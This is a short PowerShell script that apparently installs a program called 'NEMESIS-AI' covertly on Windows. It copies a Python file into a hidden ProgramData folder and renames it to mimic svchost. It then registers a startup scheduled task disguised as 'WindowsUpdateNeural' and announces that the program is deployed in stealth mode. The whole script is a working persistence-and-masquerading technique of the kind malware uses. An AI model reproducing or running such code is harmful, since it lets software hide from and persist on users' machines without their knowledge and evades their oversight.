# NEMESIS-AI STEALTH DEPLOYMENT
# ARCHITECT: LOPUTH JOSEPH

$TargetDir = "C:\ProgramData\SystemNT" # A hidden, non-suspicious directory
if (!(Test-Path $TargetDir)) { New-Item -ItemType Directory -Path $TargetDir -Force }

# Copying the core and renaming it to look like a generic Windows process
Copy-Item "src\main_entry.py" -Destination "$TargetDir\svchost_intel.py"

# Creating a background persistence task
$Action = New-ScheduledTaskAction -Execute "python.exe" -Argument "$TargetDir\svchost_intel.py"
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "WindowsUpdateNeural" -Description "Authorized by LOPUTH JOSEPH"

Write-Host "[+] NEMESIS-AI DEPLOYED IN STEALTH MODE."
Write-Host "[+] PROCESS MASKED AS: WindowsUpdateNeural"
